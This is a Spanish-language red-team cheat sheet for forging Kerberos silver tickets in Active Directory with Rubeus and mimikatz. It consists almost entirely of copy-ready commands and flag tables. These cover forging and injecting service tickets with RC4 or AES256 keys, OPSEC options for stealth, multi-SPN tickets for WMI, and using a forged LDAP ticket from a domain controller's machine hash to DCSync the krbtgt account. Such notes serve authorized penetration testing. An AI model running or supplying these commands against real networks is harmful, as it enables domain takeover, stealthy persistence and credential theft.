---
aliases:
  - Silver Ticket Windows
  - mimikatz silver
tags:
  - technique/persistence
  - technique/kerberos
  - env/windows
  - asset/active-directory
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
kind: SubCheatSheet
linked:
  - "[[Silver Ticket]]"
---

# Silver Ticket - Forging Windows

---

## Rubeus silver — RC4

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe silver /service:cifs/host.corp.local /rc4:HASH /user:administrator /ptt` | TGS forjado + inject RC4 | Standard — sin /ldap. |
| `Rubeus.exe silver /service:cifs/host.corp.local /rc4:HASH /ldap /user:administrator /ptt` | TGS con PAC real del AD | Más realista — consulta LDAP. |
| `Rubeus.exe silver /service:cifs/host.corp.local /rc4:HASH /user:administrator /outfile:silver.kirbi` | Forge sin inject → archivo | Para transferir. |
^st-forge-win-rc4

```powershell
.\Rubeus.exe silver `
  /service:cifs/web01.corp.local `
  /rc4:COMPUTERNTHASH `
  /user:administrator `
  /id:500 `
  /domain:corp.local `
  /sid:S-1-5-21-... `
  /ldap `
  /ptt

klist
dir \\web01.corp.local\c$
```

---

## Rubeus silver — AES256 (OPSEC)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe silver /service:cifs/host.corp.local /aes256:KEY /ldap /user:administrator /ptt` | TGS AES256 — sin downgrade | Stealth en dominios AES-only. |
| `/opsec` flag | Ajusta flags del ticket | Extra OPSEC. |
^st-forge-win-aes

```powershell
.\Rubeus.exe silver `
  /service:cifs/web01.corp.local `
  /aes256:AES256KEY `
  /user:administrator `
  /id:500 `
  /domain:corp.local `
  /sid:S-1-5-21-... `
  /ldap `
  /ptt /opsec
```

---

## Rubeus silver — flags avanzados

| **Flag** | **Valor** | **Efecto** |
|:---:|:---:|:---:|
| `/service:<SPN>` | `cifs/host.corp.local` | SPN objetivo — obligatorio. |
| `/ldap` | flag | PAC real del AD para el user. Más realista. |
| `/id:<RID>` | `500` | RID en PAC. |
| `/groups:<RIDs>` | `512,513` | DA + DU en PAC. |
| `/sid:<SID>` | Domain SID | Necesario si no `/ldap`. |
| `/startoffset:<min>` | `-5` | Backdate (clock skew buffer). |
| `/endin:<min>` | `600` (10h) | TGS end time. |
| `/renewmax:<min>` | `10080` (7d) | Max renew. |
^st-forge-win-flags

```powershell
# WMI requiere host/ + rpcss/ — multi-SPN
.\Rubeus.exe silver `
  /service:host/web01.corp.local,rpcss/web01.corp.local `
  /aes256:AES256KEY `
  /user:administrator /id:500 `
  /domain:corp.local /sid:S-1-5-21-... `
  /ldap /ptt
```

---

## mimikatz kerberos::golden (silver mode)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `kerberos::golden /user:admin /domain:corp.local /sid:SID /target:host.corp.local /service:cifs /rc4:HASH /ptt` | TGS forjado + inject | On-host standard. |
| `kerberos::golden /user:admin /domain:corp.local /sid:SID /target:host.corp.local /service:cifs /aes256:KEY /ptt` | AES256 | OPSEC. |
| `kerberos::golden ... /id:500 /groups:512,513,520,518,519 /ptt` | Con RID + groups | Full PAC. |
^st-forge-win-mimi

```
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:web01.corp.local /service:cifs /rc4:NTHASH /id:500 /groups:512,513 /ptt
mimikatz # misc::cmd

:: En cmd
dir \\web01.corp.local\c$
```

---

## DCSync via Silver Ticket (LDAP, on-host)

| **Paso** | **Comando** | **Cuándo** |
|:---:|:---:|:---:|
| Forge TGS para ldap/ con hash DC$ | `Rubeus.exe silver /service:ldap/dc.corp.local /rc4:DC_HASH /ldap /ptt` | DC$ hash pero no DA. |
| Verificar inject | `klist` | Post-inject. |
| DCSync via LDAP silver | `mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt` | Con TGS LDAP inyectado. |
^st-forge-win-dcsync

```powershell
.\Rubeus.exe silver /service:ldap/dc01.corp.local /rc4:DC_HASH /ldap /user:administrator /ptt
klist
# Service: ldap/dc01.corp.local

.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

---
